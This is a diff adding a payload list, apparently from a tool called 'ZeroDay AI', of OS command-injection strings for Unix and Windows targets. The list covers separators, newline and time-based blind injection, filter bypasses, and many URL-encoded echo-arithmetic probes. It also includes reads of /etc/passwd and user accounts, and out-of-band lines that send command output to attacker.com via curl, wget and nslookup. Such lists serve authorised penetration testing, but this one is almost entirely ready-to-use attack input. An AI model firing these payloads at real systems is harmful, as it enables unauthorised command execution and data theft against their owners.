@@ -1,0 +1,160 @@
+# Command Injection Payloads â€” ZeroDay AI
+# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+
+# Unix separators
+; id
+& id
+&& id
+| id
+|| id
+`id`
+$(id)
+; whoami
+& whoami
+| whoami
+`whoami`
+$(whoami)
+; cat /etc/passwd
+| cat /etc/passwd
+# Windows
+; dir
+& dir
+| type C:\Windows\win.ini
+& ipconfig /all
+| net user
+# Newline injection
+%0a id
+%0d%0a id
+%0aid
+\nid
+# Blind (OOB via DNS â€” replace with your domain)
+; nslookup `id`.attacker.com
+; curl http://attacker.com/`id`
+; wget http://attacker.com/?data=`id`
+| ping -c 1 attacker.com
+& nslookup attacker.com
+# Time-based blind
+; sleep 5
+& sleep 5
+| sleep 5
+`sleep 5`
+$(sleep 5)
+; ping -c 5 127.0.0.1
+& timeout /t 5
+# Bypasses
+;id;
+${IFS}id
+{id}
+$'\x69\x64'
+$"id"
+id
+/usr/bin/id
+# Special characters that may break parsers
+'id'
+"id"
+\;id
+,id
+@id
+%3b id
+%26 id
+%7c id
+echo%20AGIYMZ$((69%2B52))$(echo%20AGIYMZ)AGIYMZ
+%20echo%20TDJHRY$((30%2B41))$(echo%20TDJHRY)TDJHRY
+;echo%20MPCSBG$((54%2B42))$(echo%20MPCSBG)MPCSBG
+&echo%20NWMZCF$((57%2B72))$(echo%20NWMZCF)NWMZCF
+|echo%20TJEGSE$((27%2B57))$(echo%20TJEGSE)TJEGSE
+||echo%20ANSBHE$((26%2B89))$(echo%20ANSBHE)ANSBHE
+&&echo%20PVJXOS$((12%2B1))$(echo%20PVJXOS)PVJXOS
+%0aecho%20VVIEOJ$((30%2B78))$(echo%20VVIEOJ)VVIEOJ
+%3Becho%20SRPJET$((29%2B34))$(echo%20SRPJET)SRPJET
+%26echo%20NQPWBV$((16%2B77))$(echo%20NQPWBV)NQPWBV
+%26%26echo%20QOZRFB$((19%2B4))$(echo%20QOZRFB)QOZRFB
+%7Cecho%20IRODNG$((26%2B68))$(echo%20IRODNG)IRODNG
+%7C%7Cecho%20KRCSNE$((57%2B75))$(echo%20KRCSNE)KRCSNE
+echo%20IFNPXI$((40%2B99))$(echo%20IFNPXI)IFNPXI'
+%20echo%20HBFEEM$((46%2B2))$(echo%20HBFEEM)HBFEEM'
+;echo%20KHMFRS$((69%2B67))$(echo%20KHMFRS)KHMFRS'
+&echo%20DACXMN$((57%2B35))$(echo%20DACXMN)DACXMN'
+|echo%20DDLJJW$((33%2B23))$(echo%20DDLJJW)DDLJJW'
+||echo%20XIYAUA$((17%2B90))$(echo%20XIYAUA)XIYAUA'
+&&echo%20CMMOTV$((30%2B10))$(echo%20CMMOTV)CMMOTV'
+%0aecho%20VKWHEH$((83%2B36))$(echo%20VKWHEH)VKWHEH'
+%3Becho%20RDKWWC$((22%2B44))$(echo%20RDKWWC)RDKWWC'
+%26echo%20VOANQN$((77%2B86))$(echo%20VOANQN)VOANQN'
+%26%26echo%20EXUMZL$((4%2B99))$(echo%20EXUMZL)EXUMZL'
+%7Cecho%20VDZSYZ$((58%2B1))$(echo%20VDZSYZ)VDZSYZ'
+%7C%7Cecho%20HYHREQ$((78%2B11))$(echo%20HYHREQ)HYHREQ'
+echo%20GHWFXG$((12%2B72))$(echo%20GHWFXG)GHWFXG"
+%20echo%20BAJXZZ$((73%2B7))$(echo%20BAJXZZ)BAJXZZ"
+;echo%20YRBNTY$((83%2B14))$(echo%20YRBNTY)YRBNTY"
+&echo%20WQLTXV$((0%2B25))$(echo%20WQLTXV)WQLTXV"
+|echo%20PRCGGO$((57%2B79))$(echo%20PRCGGO)PRCGGO"
+||echo%20RWZHCR$((74%2B28))$(echo%20RWZHCR)RWZHCR"
+&&echo%20QTDSQL$((20%2B35))$(echo%20QTDSQL)QTDSQL"
+%0aecho%20NCRQQT$((66%2B95))$(echo%20NCRQQT)NCRQQT"
+%3Becho%20QXBWJP$((56%2B78))$(echo%20QXBWJP)QXBWJP"
+%26echo%20YYWLTQ$((61%2B71))$(echo%20YYWLTQ)YYWLTQ"
+%26%26echo%20XKFEGJ$((1%2B49))$(echo%20XKFEGJ)XKFEGJ"
+%7Cecho%20YPOSVR$((24%2B62))$(echo%20YPOSVR)YPOSVR"
+%7C%7Cecho%20CFGBVN$((38%2B88))$(echo%20CFGBVN)CFGBVN"
+echo%20CWRXRJ$((77%2B13))$(echo%20CWRXRJ)CWRXRJ
+%20echo%20IBQHOS$((92%2B76))$(echo%20IBQHOS)IBQHOS
+;echo%20CSPAAF$((48%2B26))$(echo%20CSPAAF)CSPAAF
+&echo%20DRUCFI$((69%2B56))$(echo%20DRUCFI)DRUCFI
+|echo%20TWNZDU$((10%2B40))$(echo%20TWNZDU)TWNZDU
+||echo%20TPIMPW$((11%2B13))$(echo%20TPIMPW)TPIMPW
+&&echo%20FOJNEL$((64%2B8))$(echo%20FOJNEL)FOJNEL
+%0aecho%20MBVQWK$((48%2B90))$(echo%20MBVQWK)MBVQWK
+%3Becho%20RHJGKQ$((38%2B71))$(echo%20RHJGKQ)RHJGKQ
+%26echo%20MUQJWT$((7%2B78))$(echo%20MUQJWT)MUQJWT
+%26%26echo%20KHAVOV$((90%2B77))$(echo%20KHAVOV)KHAVOV
+%7Cecho%20SUHDBU$((66%2B15))$(echo%20SUHDBU)SUHDBU
+%7C%7Cecho%20FEGCUU$((21%2B29))$(echo%20FEGCUU)FEGCUU
+echo%20DINEVC$((57%2B17))$(echo%20DINEVC)DINEVC//
+%20echo%20BSYIFX$((64%2B71))$(echo%20BSYIFX)BSYIFX//
+;echo%20FRDAGY$((96%2B63))$(echo%20FRDAGY)FRDAGY//
+&echo%20QLUITC$((73%2B99))$(echo%20QLUITC)QLUITC//
+|echo%20SBZVBA$((97%2B74))$(echo%20SBZVBA)SBZVBA//
+||echo%20ZZJQZV$((83%2B59))$(echo%20ZZJQZV)ZZJQZV//
+&&echo%20RIWFAA$((64%2B99))$(echo%20RIWFAA)RIWFAA//
+%0aecho%20MESJOF$((62%2B27))$(echo%20MESJOF)MESJOF//
+%3Becho%20SVKHMK$((30%2B19))$(echo%20SVKHMK)SVKHMK//
+%26echo%20ZPAVCI$((24%2B53))$(echo%20ZPAVCI)ZPAVCI//
+%26%26echo%20MXMWUR$((62%2B86))$(echo%20MXMWUR)MXMWUR//
+%7Cecho%20AGUYET$((89%2B40))$(echo%20AGUYET)AGUYET//
+%7C%7Cecho%20SBQJMU$((91%2B44))$(echo%20SBQJMU)SBQJMU//
+echo%20ZUXLTJ$((16%2B69))$(echo%20ZUXLTJ)ZUXLTJ\
+%20echo%20QQZCOQ$((29%2B94))$(echo%20QQZCOQ)QQZCOQ\
+;echo%20KHCYPO$((77%2B38))$(echo%20KHCYPO)KHCYPO\
+&echo%20MCEEEZ$((59%2B2))$(echo%20MCEEEZ)MCEEEZ\
+|echo%20OYDZIJ$((96%2B61))$(echo%20OYDZIJ)OYDZIJ\
+||echo%20PJBTDO$((60%2B74))$(echo%20PJBTDO)PJBTDO\
+&&echo%20HETHMD$((47%2B99))$(echo%20HETHMD)HETHMD\
+%0aecho%20HNNUGD$((25%2B95))$(echo%20HNNUGD)HNNUGD\
+%3Becho%20OFIKGO$((60%2B50))$(echo%20OFIKGO)OFIKGO\
+%26echo%20RKCZIL$((79%2B92))$(echo%20RKCZIL)RKCZIL\
+%26%26echo%20WLJUON$((15%2B95))$(echo%20WLJUON)WLJUON\
+%7Cecho%20WEBPND$((27%2B55))$(echo%20WEBPND)WEBPND\
+%7C%7Cecho%20HKTMWP$((40%2B9))$(echo%20HKTMWP)HKTMWP\
+echo%20MTEZNM$((22%2B3))$(echo%20MTEZNM)MTEZNM&
+%20echo%20YPQTYX$((9%2B27))$(echo%20YPQTYX)YPQTYX&
+;echo%20UNXFGJ$((26%2B60))$(echo%20UNXFGJ)UNXFGJ&
+&echo%20KUCRVN$((73%2B39))$(echo%20KUCRVN)KUCRVN&
+|echo%20FNYPPK$((77%2B83))$(echo%20FNYPPK)FNYPPK&
+||echo%20NRVZFD$((41%2B1))$(echo%20NRVZFD)NRVZFD&
+&&echo%20QAGWEJ$((84%2B54))$(echo%20QAGWEJ)QAGWEJ&
+%0aecho%20HNTZSH$((50%2B30))$(echo%20HNTZSH)HNTZSH&
+%3Becho%20HGVPJY$((28%2B49))$(echo%20HGVPJY)HGVPJY&
+%26echo%20FWAUTF$((39%2B22))$(echo%20FWAUTF)FWAUTF&
+%26%26echo%20BSQKBM$((74%2B49))$(echo%20BSQKBM)BSQKBM&
+%7Cecho%20SEIDBX$((80%2B51))$(echo%20SEIDBX)SEIDBX&
+%7C%7Cecho%20TVKSTF$((99%2B96))$(echo%20TVKSTF)TVKSTF&
+echo%20XOEUCM$((23%2B30))$(echo%20XOEUCM)XOEUCM|
+%20echo%20DRFYNB$((7%2B97))$(echo%20DRFYNB)DRFYNB|
+;echo%20SIRYMP$((7%2B6))$(echo%20SIRYMP)SIRYMP|
+&echo%20SPRAWO$((58%2B5))$(echo%20SPRAWO)SPRAWO|
+|echo%20OTDJOE$((4%2B21))$(echo%20OTDJOE)OTDJOE|
+||echo%20RFRIIL$((68%2B10))$(echo%20RFRIIL)RFRIIL|
+&&echo%20GKEMGA$((51%2B90))$(echo%20GKEMGA)GKEMGA|
+%0aecho%20ZNOLCP$((67%2B83))$(echo%20ZNOLCP)ZNOLCP|
+%3Becho%20PSHEAA$((43%2B12))$(echo%20PSHEAA)PSHEAA|
